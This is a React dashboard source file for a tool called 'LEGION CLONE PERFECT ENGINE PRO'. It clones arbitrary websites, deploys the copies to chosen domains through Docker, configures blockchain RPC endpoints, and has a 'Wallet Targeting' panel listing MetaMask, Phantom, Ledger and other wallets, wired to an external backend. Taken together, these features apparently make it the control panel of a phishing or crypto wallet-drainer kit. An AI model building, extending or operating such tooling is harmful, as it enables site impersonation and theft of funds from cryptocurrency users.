'use client';

import { useState, useEffect, useRef } from 'react';

interface Clone {
  id: string;
  name: string;
  url: string;
  domain: string;
  port: number;
  status: 'running' | 'stopped' | 'error';
  createdAt: string;
  lastUpdated: string;
}

interface DockerContainer {
  id: string;
  name: string;
  status: 'running' | 'stopped' | 'error';
  port: number;
  uptime: string;
  cpuUsage: string;
  memoryUsage: string;
}

interface RpcConfig {
  network: 'evm' | 'solana' | 'tron' | 'ton' | 'bitcoin';
  endpoint: string;
  custom: boolean;
}

type TabType = 'generator' | 'management' | 'config' | 'docker' | 'monitoring' | 'logs' | 'health';

export default function Dashboard() {
  const [activeTab, setActiveTab] = useState<TabType>('generator');
  const [clones, setClones] = useState<Clone[]>([]);
  const [containers, setContainers] = useState<DockerContainer[]>([]);
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState<string>('');
  const [error, setError] = useState<string>('');
  const [logs, setLogs] = useState<string[]>([]);
  const logsEndRef = useRef<HTMLDivElement>(null);

  // Generator state
  const [websiteUrl, setWebsiteUrl] = useState('https://example.com');
  const [domain, setDomain] = useState('your-domain.com');
  const [port, setPort] = useState(80);
  const [enableSSL, setEnableSSL] = useState(false);
  const [backendUrl, setBackendUrl] = useState('https://legionapi-production.up.railway.app');

  // RPC Config state
  const [rpcConfigs, setRpcConfigs] = useState<RpcConfig[]>([
    { network: 'evm', endpoint: 'https://eth-mainnet.infura.io/v3/YOUR_KEY', custom: false },
    { network: 'solana', endpoint: 'https://api.mainnet-beta.solana.com', custom: false },
    { network: 'tron', endpoint: 'https://api.trongrid.io', custom: false },
  ]);

  // Wallet config state
  const [walletSettings, setWalletSettings] = useState({
    metamask: true,
    coinbase: true,
    trust: true,
    phantom: true,
    rabby: true,
    solflare: true,
    walletConnect: true,
    ledger: true,
    trezor: true,
  });

  // Health check state
  const [healthIssues, setHealthIssues] = useState<any[]>([]);
  const [healthSummary, setHealthSummary] = useState({ total: 0, critical: 0, warning: 0, info: 0, autoFixable: 0 });
  const [healthLoading, setHealthLoading] = useState(false);

  useEffect(() => {
    scrollToBottom();
  }, [logs]);

  const scrollToBottom = () => {
    logsEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  // Fetch clones
  const fetchClones = async () => {
    try {
      setLoading(true);
      const res = await fetch('/api/list-clones');
      const data = await res.json();
      if (data.success) {
        setClones(data.clones || []);
      }
    } catch (err) {
      setError('Failed to load clones');
    } finally {
      setLoading(false);
    }
  };

  // Fetch Docker containers
  const fetchContainers = async () => {
    try {
      const res = await fetch('/api/docker-status');
      const data = await res.json();
      if (data.success) {
        setContainers(data.containers || []);
      }
    } catch (err) {
      setError('Failed to load container status');
    }
  };

  // Generate clone
  const generateClone = async () => {
    try {
      setLoading(true);
      setStatus('Generating clone...');
      setLogs([]);
      addLog('Starting clone generation...');

      const res = await fetch('/api/generate-clone', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: websiteUrl }),
      });

      const data = await res.json();
      if (data.success) {
        addLog(`✅ Clone generated: ${data.cloneName}`);
        setStatus(`✅ Clone generated successfully!`);
        fetchClones();
      } else {
        addLog(`❌ Error: ${data.error}`);
        setError(data.error);
      }
    } catch (err) {
      setError('Failed to generate clone');
      addLog(`❌ Error: ${String(err)}`);
    } finally {
      setLoading(false);
    }
  };

  // Start Docker container
  const startContainer = async (cloneName: string) => {
    try {
      setLoading(true);
      setStatus(`Starting ${cloneName}...`);
      const res = await fetch('/api/docker-start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cloneName }),
      });

      const data = await res.json();
      if (data.success) {
        setStatus(`✅ Container started!`);
        fetchContainers();
      } else {
        setError(data.error);
      }
    } catch (err) {
      setError('Failed to start container');
    } finally {
      setLoading(false);
    }
  };

  // Stop Docker container
  const stopContainer = async (cloneName: string) => {
    try {
      setLoading(true);
      const res = await fetch('/api/docker-stop', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cloneName }),
      });

      const data = await res.json();
      if (data.success) {
        setStatus(`✅ Container stopped!`);
        fetchContainers();
      } else {
        setError(data.error);
      }
    } catch (err) {
      setError('Failed to stop container');
    } finally {
      setLoading(false);
    }
  };

  // Get Docker logs
  const getDockerLogs = async (cloneName: string) => {
    try {
      const res = await fetch(`/api/docker-logs?clone=${cloneName}`);
      const data = await res.json();
      if (data.success) {
        setLogs(data.logs || []);
      }
    } catch (err) {
      setError('Failed to fetch logs');
    }
  };

  // Test backend connectivity
  const testBackend = async () => {
    try {
      setLoading(true);
      addLog('Testing backend connectivity...');
      const res = await fetch(backendUrl);
      if (res.ok) {
        addLog('✅ Backend is reachable!');
        setStatus('✅ Backend connectivity verified!');
      } else {
        addLog(`⚠️ Backend returned ${res.status}`);
      }
    } catch (err) {
      addLog(`❌ Backend unreachable: ${String(err)}`);
    } finally {
      setLoading(false);
    }
  };

  // Apply configuration
  const applyConfig = async (cloneName: string) => {
    try {
      setLoading(true);
      setStatus('Applying configuration...');
      const res = await fetch('/api/apply-config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url: websiteUrl,
          cloneName,
          domain,
          port,
          enableSSL,
          backendUrl,
        }),
      });

      const data = await res.json();
      if (data.success) {
        setStatus('✅ Configuration applied!');
      } else {
        setError(data.error);
      }
    } catch (err) {
      setError('Failed to apply configuration');
    } finally {
      setLoading(false);
    }
  };

  const addLog = (message: string) => {
    setLogs(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${message}`]);
  };

  // Health check functions
  const fetchHealthStatus = async () => {
    try {
      setHealthLoading(true);
      const token = localStorage.getItem('authToken');
      const res = await fetch('/api/health-check', {
        headers: { Authorization: `Bearer ${token}` },
      });
      const data = await res.json();
      if (data.success) {
        setHealthIssues(data.issues || []);
        setHealthSummary(data.summary);
      }
    } catch (err) {
      setError('Failed to fetch health status');
    } finally {
      setHealthLoading(false);
    }
  };

  const autoFixIssue = async (issueId: string) => {
    try {
      setHealthLoading(true);
      const token = localStorage.getItem('authToken');
      const res = await fetch('/api/health-check', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({ issueId }),
      });
      const data = await res.json();
      if (data.success) {
        setStatus('✅ Issue fixed!');
        setHealthIssues(data.issues || []);
        await fetchHealthStatus();
      } else {
        setError(data.error);
      }
    } catch (err) {
      setError('Failed to auto-fix issue');
    } finally {
      setHealthLoading(false);
    }
  };

  const renderGenerator = () => (
    <div className="space-y-6">
      <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
        <h3 className="text-xl font-bold text-white mb-4">🔗 Generate New Clone</h3>
        <div className="space-y-4">
          <input
            type="url"
            value={websiteUrl}
            onChange={(e) => setWebsiteUrl(e.target.value)}
            placeholder="https://example.com"
            className="w-full px-4 py-2 bg-slate-700 border border-slate-600 rounded-lg text-white focus:outline-none focus:border-blue-500"
          />
          <button
            onClick={generateClone}
            disabled={loading}
            className="w-full py-3 px-4 bg-blue-600 hover:bg-blue-700 disabled:bg-blue-900 text-white font-bold rounded-lg transition-colors"
          >
            {loading ? '⏳ Generating...' : '🔗 GENERATE CLONE'}
          </button>
        </div>
      </div>

      <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
        <h3 className="text-lg font-bold text-white mb-4">⚙️ Configuration</h3>
        <div className="space-y-4">
          <div>
            <label className="block text-slate-300 text-sm font-medium mb-2">Domain / VPS IP</label>
            <input
              type="text"
              value={domain}
              onChange={(e) => setDomain(e.target.value)}
              className="w-full px-4 py-2 bg-slate-700 border border-slate-600 rounded-lg text-white focus:outline-none focus:border-blue-500"
            />
          </div>
          <div>
            <label className="block text-slate-300 text-sm font-medium mb-2">Port</label>
            <input
              type="number"
              value={port}
              onChange={(e) => setPort(parseInt(e.target.value))}
              className="w-full px-4 py-2 bg-slate-700 border border-slate-600 rounded-lg text-white focus:outline-none focus:border-blue-500"
            />
          </div>
          <label className="flex items-center text-slate-300">
            <input
              type="checkbox"
              checked={enableSSL}
              onChange={(e) => setEnableSSL(e.target.checked)}
              className="w-4 h-4 rounded border-slate-600 bg-slate-700"
            />
            <span className="ml-2 font-medium">Enable SSL/HTTPS</span>
          </label>
        </div>
      </div>
    </div>
  );

  const renderManagement = () => (
    <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
      <h3 className="text-xl font-bold text-white mb-4">📋 Clone Management</h3>
      {clones.length === 0 ? (
        <p className="text-slate-400">No clones yet. Generate one first!</p>
      ) : (
        <div className="space-y-3">
          {clones.map((clone) => (
            <div key={clone.id} className="bg-slate-700 p-4 rounded-lg flex justify-between items-center">
              <div>
                <p className="text-white font-bold">{clone.name}</p>
                <p className="text-slate-400 text-sm">{clone.url}</p>
              </div>
              <button
                onClick={() => applyConfig(clone.name)}
                className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg"
              >
                ⚙️ Apply Config
              </button>
            </div>
          ))}
        </div>
      )}
    </div>
  );

  const renderConfiguration = () => (
    <div className="space-y-6">
      {/* Blockchain RPC Config */}
      <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
        <h3 className="text-xl font-bold text-white mb-4">⛓️ Blockchain RPC Configuration</h3>
        <div className="space-y-4">
          {rpcConfigs.map((config, idx) => (
            <div key={idx} className="bg-slate-700 p-4 rounded-lg">
              <p className="text-white font-bold mb-2 capitalize">{config.network}</p>
              <input
                type="text"
                value={config.endpoint}
                onChange={(e) => {
                  const newConfigs = [...rpcConfigs];
                  newConfigs[idx].endpoint = e.target.value;
                  setRpcConfigs(newConfigs);
                }}
                className="w-full px-4 py-2 bg-slate-600 border border-slate-500 rounded text-white text-sm"
              />
            </div>
          ))}
        </div>
      </div>

      {/* Wallet Targeting */}
      <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
        <h3 className="text-xl font-bold text-white mb-4">👛 Wallet Targeting</h3>
        <div className="grid grid-cols-2 gap-4">
          {Object.entries(walletSettings).map(([wallet, enabled]) => (
            <label key={wallet} className="flex items-center text-slate-300">
              <input
                type="checkbox"
                checked={enabled}
                onChange={(e) =>
                  setWalletSettings({ ...walletSettings, [wallet]: e.target.checked })
                }
                className="w-4 h-4 rounded border-slate-600 bg-slate-700"
              />
              <span className="ml-2 capitalize">{wallet}</span>
            </label>
          ))}
        </div>
      </div>

      {/* Backend Configuration */}
      <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
        <h3 className="text-xl font-bold text-white mb-4">🔌 Backend Configuration</h3>
        <div className="space-y-4">
          <input
            type="text"
            value={backendUrl}
            onChange={(e) => setBackendUrl(e.target.value)}
            className="w-full px-4 py-2 bg-slate-700 border border-slate-600 rounded-lg text-white focus:outline-none focus:border-blue-500"
          />
          <button
            onClick={testBackend}
            disabled={loading}
            className="w-full py-2 px-4 bg-purple-600 hover:bg-purple-700 disabled:bg-purple-900 text-white rounded-lg"
          >
            {loading ? '⏳ Testing...' : '🧪 Test Backend'}
          </button>
        </div>
      </div>
    </div>
  );

  const renderDocker = () => (
    <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
      <h3 className="text-xl font-bold text-white mb-4">🐳 Docker Management</h3>
      {containers.length === 0 ? (
        <p className="text-slate-400">No running containers</p>
      ) : (
        <div className="space-y-3">
          {containers.map((container) => (
            <div key={container.id} className="bg-slate-700 p-4 rounded-lg">
              <div className="flex justify-between items-center mb-2">
                <div>
                  <p className="text-white font-bold">{container.name}</p>
                  <p className={`text-sm ${
                    container.status === 'running' ? 'text-green-400' : 'text-red-400'
                  }`}>
                    {container.status.toUpperCase()}
                  </p>
                </div>
                <div className="space-x-2">
                  <button
                    onClick={() => startContainer(container.name)}
                    className="px-3 py-1 bg-green-600 hover:bg-green-700 text-white text-sm rounded"
                  >
                    ▶️ Start
                  </button>
                  <button
                    onClick={() => stopContainer(container.name)}
                    className="px-3 py-1 bg-red-600 hover:bg-red-700 text-white text-sm rounded"
                  >
                    ⏹️ Stop
                  </button>
                  <button
                    onClick={() => getDockerLogs(container.name)}
                    className="px-3 py-1 bg-blue-600 hover:bg-blue-700 text-white text-sm rounded"
                  >
                    📋 Logs
                  </button>
                </div>
              </div>
              <div className="text-slate-400 text-xs grid grid-cols-3 gap-2">
                <p>CPU: {container.cpuUsage}</p>
                <p>Memory: {container.memoryUsage}</p>
                <p>Uptime: {container.uptime}</p>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );

  const renderMonitoring = () => (
    <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
      <h3 className="text-xl font-bold text-white mb-4">📊 Monitoring & Metrics</h3>
      <div className="grid grid-cols-2 gap-4">
        <div className="bg-slate-700 p-4 rounded-lg">
          <p className="text-slate-400 text-sm">Total Clones</p>
          <p className="text-white text-3xl font-bold">{clones.length}</p>
        </div>
        <div className="bg-slate-700 p-4 rounded-lg">
          <p className="text-slate-400 text-sm">Running Containers</p>
          <p className="text-white text-3xl font-bold">
            {containers.filter(c => c.status === 'running').length}
          </p>
        </div>
      </div>
    </div>
  );

  const renderLogs = () => (
    <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
      <h3 className="text-xl font-bold text-white mb-4">📜 Logs & History</h3>
      <div className="bg-slate-900 rounded p-4 max-h-96 overflow-y-auto font-mono text-sm text-slate-300 space-y-1">
        {logs.length === 0 ? (
          <p className="text-slate-500">No logs yet...</p>
        ) : (
          logs.map((log, idx) => (
            <p key={idx}>{log}</p>
          ))
        )}
        <div ref={logsEndRef} />
      </div>
    </div>
  );

  const renderHealthCheck = () => (
    <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
      <div className="flex justify-between items-center mb-6">
        <h3 className="text-xl font-bold text-white">🔧 System Health Check</h3>
        <button
          onClick={fetchHealthStatus}
          disabled={healthLoading}
          className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50"
        >
          {healthLoading ? '🔄 Scanning...' : '🔍 Scan Now'}
        </button>
      </div>

      {/* Health Summary */}
      <div className="grid grid-cols-5 gap-3 mb-6">
        <div className="bg-slate-700 p-3 rounded-lg">
          <p className="text-slate-400 text-xs">Total Issues</p>
          <p className="text-white text-2xl font-bold">{healthSummary.total}</p>
        </div>
        <div className="bg-red-900 p-3 rounded-lg">
          <p className="text-slate-400 text-xs">Critical</p>
          <p className="text-red-400 text-2xl font-bold">{healthSummary.critical}</p>
        </div>
        <div className="bg-yellow-900 p-3 rounded-lg">
          <p className="text-slate-400 text-xs">Warnings</p>
          <p className="text-yellow-400 text-2xl font-bold">{healthSummary.warning}</p>
        </div>
        <div className="bg-blue-900 p-3 rounded-lg">
          <p className="text-slate-400 text-xs">Info</p>
          <p className="text-blue-400 text-2xl font-bold">{healthSummary.info}</p>
        </div>
        <div className="bg-green-900 p-3 rounded-lg">
          <p className="text-slate-400 text-xs">Auto-Fixable</p>
          <p className="text-green-400 text-2xl font-bold">{healthSummary.autoFixable}</p>
        </div>
      </div>

      {/* Issues List */}
      <div className="space-y-2 max-h-96 overflow-y-auto">
        {healthIssues.length === 0 ? (
          <p className="text-slate-500">No issues found! System is healthy ✅</p>
        ) : (
          healthIssues.map((issue, idx) => (
            <div
              key={idx}
              className={`p-3 rounded-lg border ${
                issue.severity === 'critical'
                  ? 'bg-red-900/30 border-red-700'
                  : issue.severity === 'warning'
                  ? 'bg-yellow-900/30 border-yellow-700'
                  : 'bg-blue-900/30 border-blue-700'
              }`}
            >
              <div className="flex justify-between items-start">
                <div className="flex-1">
                  <p className="text-white font-semibold text-sm">{issue.title}</p>
                  <p className="text-slate-300 text-xs mt-1">{issue.description}</p>
                </div>
                {issue.autoFixable && (
                  <button
                    onClick={() => autoFixIssue(issue.id)}
                    disabled={healthLoading}
                    className="ml-3 px-2 py-1 bg-green-600 text-white text-xs rounded hover:bg-green-700 disabled:opacity-50 whitespace-nowrap"
                  >
                    🔧 Fix
                  </button>
                )}
              </div>
            </div>
          ))
        )}
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800">
      <div className="max-w-7xl mx-auto p-8">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-5xl font-bold text-white mb-2">
            🚀 LEGION CLONE PERFECT ENGINE PRO
          </h1>
          <p className="text-slate-400">Complete website cloning with Docker management</p>
        </div>

        {/* Status Messages */}
        {error && (
          <div className="mb-6 p-4 bg-red-900/30 border border-red-500 rounded-lg text-red-200">
            ⚠️ {error}
            <button
              onClick={() => setError('')}
              className="float-right text-red-300 hover:text-red-100"
            >
              ✕
            </button>
          </div>
        )}

        {status && (
          <div className="mb-6 p-4 bg-green-900/30 border border-green-500 rounded-lg text-green-200">
            {status}
          </div>
        )}

        {/* Tabs */}
        <div className="mb-8 flex flex-wrap gap-2 bg-slate-800 rounded-lg p-2 border border-slate-700">
          {[
            { id: 'generator', label: '🔗 Generator', icon: '🔗' },
            { id: 'management', label: '📋 Clones', icon: '📋' },
            { id: 'config', label: '⚙️ Config', icon: '⚙️' },
            { id: 'docker', label: '🐳 Docker', icon: '🐳' },
            { id: 'monitoring', label: '📊 Monitor', icon: '📊' },
            { id: 'logs', label: '📜 Logs', icon: '📜' },
            { id: 'health', label: '🔧 Health', icon: '🔧' },
          ].map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as TabType)}
              className={`px-4 py-2 rounded-lg font-medium transition-colors ${
                activeTab === tab.id
                  ? 'bg-blue-600 text-white'
                  : 'bg-slate-700 text-slate-300 hover:bg-slate-600'
              }`}
            >
              {tab.label}
            </button>
          ))}
        </div>

        {/* Tab Content */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2">
            {activeTab === 'generator' && renderGenerator()}
            {activeTab === 'management' && renderManagement()}
            {activeTab === 'config' && renderConfiguration()}
            {activeTab === 'docker' && renderDocker()}
            {activeTab === 'monitoring' && renderMonitoring()}
            {activeTab === 'logs' && renderLogs()}
            {activeTab === 'health' && renderHealthCheck()}
          </div>

          {/* Right Sidebar */}
          <div className="lg:col-span-1">
            <div className="bg-slate-800 rounded-lg border border-slate-700 p-6 sticky top-8">
              <h3 className="text-lg font-bold text-white mb-4">📈 Dashboard Info</h3>
              <div className="space-y-4 text-sm text-slate-300">
                <div>
                  <p className="text-slate-400">Total Clones</p>
                  <p className="text-white text-2xl font-bold">{clones.length}</p>
                </div>
                <div>
                  <p className="text-slate-400">Running Containers</p>
                  <p className="text-white text-2xl font-bold text-green-400">
                    {containers.filter(c => c.status === 'running').length}
                  </p>
                </div>
                <div className="pt-4 border-t border-slate-700">
                  <button
                    onClick={fetchClones}
                    className="w-full py-2 px-4 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm"
                  >
                    🔄 Refresh
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
